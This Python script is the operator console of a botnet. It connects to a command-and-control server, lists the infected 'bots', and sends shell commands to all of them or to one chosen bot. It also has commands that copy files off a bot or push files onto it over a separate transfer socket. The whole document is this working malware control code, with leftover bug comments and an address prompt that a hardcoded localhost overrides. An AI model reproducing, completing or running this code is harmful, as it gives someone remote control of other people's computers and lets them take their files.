#!/usr/bin/python3
import socket
import msvcrt
import sys
from threading import Thread
import os
import time
from pathlib import Path
import re

default_buff_l = 5000
check = True
terminal_starters = ['CMD >', 'Bot ']
online_bots = []


def get_online_bots(respond):
    while respond != '':
        respond = respond[respond.find('\n') + 1:]
        online_bots.append(respond[:respond.find('\t')])


def get_respond(client) -> str:
    length = client.recv(5000).decode('utf-8')
    print("Length: " + length)
    respond = ''
    val = ''
    i = 0
    while i < int(length):
        val += client.recv(1024).decode('utf-8')
        respond += val
        i += len(val)
        val = ''
    return respond


def listen_for_respond(client, n_bots):
    # i = 0
    #  while i != int(n_bots):
        # respond = client.recv(default_buff_l).decode('utf-8')
        # print(respond)
    respond = get_respond(client)
    print(respond)
    if 'online Bots' in respond:
        get_online_bots(respond)

    # i += 1


def get_file(client, file_name):
    f = open(file_name, 'wb')
    try:
        data = client.recv(1024)
        while data:
            print('[*] Receiving...')
            f.write(data)
            data = client.recv(1024)

    except Exception as ex:
        print('Done receiving...')
        client.shutdown(socket.SHUT_WR)
        client.close()

    f.close()
    print('[+] Done receiving...')


def send_file(client, file_name):
    f = open(file_name, "rb")
    data = f.read(1024)
    while data:
        print('[*] Sending...')
        client.send(data)
        data = f.read(1024)
    f.close()

    print("[+] Done sending...")
    client.shutdown(socket.SHUT_WR)
    client.close()


def recv_respond(tcp_sock):
    return tcp_sock.recv(default_buff_l).decode('utf-8')


def send_cmd(tcp_sock, message):
    tcp_sock.send(message.encode('utf-8'), 0)


starter_picker = lambda flag, selected_bot: terminal_starters[0] if flag == 0 else terminal_starters[
                                                                                       1] + selected_bot + ' >'


def get_path_filename(command):
    cur_dir = os.path.dirname(os.path.realpath(__file__))

    return cur_dir + '\\' + command[command.find(' ') + 1:]


def listener(host, port):
    try:
        tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = (host, port)
        tcp_sock.connect(server_address)

    except Exception as ex:
        if 'WinError' in str(ex):
            print('[-] Cannot connect to the server...')
            print('[*] Make sure that server is up and running...')
            print('[*] Closing the program...')
            check = False
            exit(0)
        else:
            print(ex)

    return tcp_sock


def create_file(path_fn):
    Path(path_fn).touch()


def get_filename(command):
    return command[command.find(' ') + 1:]


def file_exist(filename) -> bool:
    exist = True
    try:
        f = open(filename)
    except IOError:
        exist = False
    finally:
        if exist:
            f.close()

    return exist


def contains_dots(ip_addr):
    number_of_dots = 0
    for str in ip_addr:
        if str == '.':
            number_of_dots += 1
    if number_of_dots == 3:
        return True
    else:
        return False


def get_address():
    while True:
        host = str(input("Please import IP address of CnC server:"))
        if not re.match(r'^\d+(\.\d+)*$', host) or contains_dots(host) is False:
            print('[-] Invalid IP address, try again...')
            continue
        else:
            break
    while True:
        port = str(input("Please import the number of port of CnC server:"))
        if not re.match('^[0-9]*$', port):
            print('[-] Invalid port number is given, try again...')
            continue
        else:
            break

    return host, port


def main():
    host, port = get_address()
    host = '127.0.0.1'
    port = 8081

    print('[+] Connecting to the CnC server...')
    tcp_sock = listener(host, port)

    print('[+] Successfully connected to the server...')

    try:
        recv = recv_respond(tcp_sock)
        print(recv)
    except Exception as ex:
        print(ex)
        exit(0)

    flag_starter = 0
    selected_bot = ''
    while True:
        try:
            keyword = input('Keyword:')
            send_cmd(tcp_sock, keyword)
            respond = recv_respond(tcp_sock)
            print(respond)

            if "Success" in respond:
                print(recv_respond(tcp_sock))
                while True:

                    cmd = str(input(starter_picker(flag_starter, selected_bot)))

                    if cmd == 'back':
                        if flag_starter != 0:
                            flag_starter = 0
                        continue

                    if cmd == "":
                        continue

                    elif cmd == "exit":
                        tcp_sock.close()
                        print("[*] Closing the program...")
                        exit(0)

                    elif cmd == "help":
                        print("\nCommands\n========\nbots\t\t\t\t\t Display the online bots.\nbot <id of bot>\t\t\t "
                              "Following "
                              "commands will be sent only to that bot with the id.\nbot <id-id>\t\t\t\t Following"
                              " commands will be send to the bots with and between id addresses.")

                    elif 'bot ' in cmd:
                        selected_bot = cmd[cmd.find(' ') + 1:]

                        if selected_bot not in online_bots:
                            print('[-] Chosen bot is not online...')
                        elif selected_bot in online_bots:
                            flag_starter = 1

                    else:
                        if flag_starter != 0:  # if any bot is selected
                            if 'cp' == cmd[:2] or 'send' in cmd:
                                if len(cmd) > 3 and 'cp' in cmd:
                                    path_fn = get_path_filename(cmd)
                                    # continue
                                    pass
                                elif 'send' in cmd and len(cmd) > 5:
                                    filename_send = get_filename(cmd)
                                    if file_exist(filename_send):
                                        pass
                                    else:
                                        print('[-] Make sure the specified file exist in the same directory as the '
                                              'program...')
                                        continue
                                else:
                                    print('[-] Please specify the file name...')
                                    continue

                            send_cmd(tcp_sock, selected_bot)  # send the bot id

                        else:
                            if 'cp' == cmd[:2] or 'send ' in cmd:
                                print('[-] This command cp can be send to only one bot, please pick a bot...')
                                continue
                            else:
                                send_cmd(tcp_sock, '0')  # 0 means the following command is for all bots

                        send_cmd(tcp_sock, cmd)  # send the command

                        n_bots = recv_respond(tcp_sock)

                        if n_bots == 'transfer':
                            time.sleep(0.6)
                            tcp_sock_tr = listener('127.0.0.1', 8000)

                            confirmation = tcp_sock_tr.recv(1024).decode('utf-8')
                            if confirmation == 'T':
                                if 'cp' in cmd:
                                    create_file(path_fn)
                                    get_file(tcp_sock_tr, path_fn)
                                elif 'send' in cmd:
                                    send_file(tcp_sock_tr, filename_send)
                            else:
                                print("[-] Please make sure file exists in current working directory...")
                                continue
                        else:
                            listen_for_respond(tcp_sock, n_bots)

                        # thread = Thread(target=listen_for_respond, args=(tcpsock, ))
                        # thread.start()

            if "Out of" in respond:
                print("[-] Connection to the server is closed...")
                return False
        except Exception as ex:
            if 'forcibly closed' in str(ex):
                print('[-] The server is down...')
                exit(0)
            else:
                print(str(ex))
                exit(0)


if __name__ == "__main__":
    main()
    # invalid literal for int() with base 10: '[+] (Bot ID: 10) SESA559338\n\x00[+] (Bot ID: 10) SESA559338\n\x00'
    # happens when id is 10 and back -> bots -> error
    # error bot without id shouldn't work
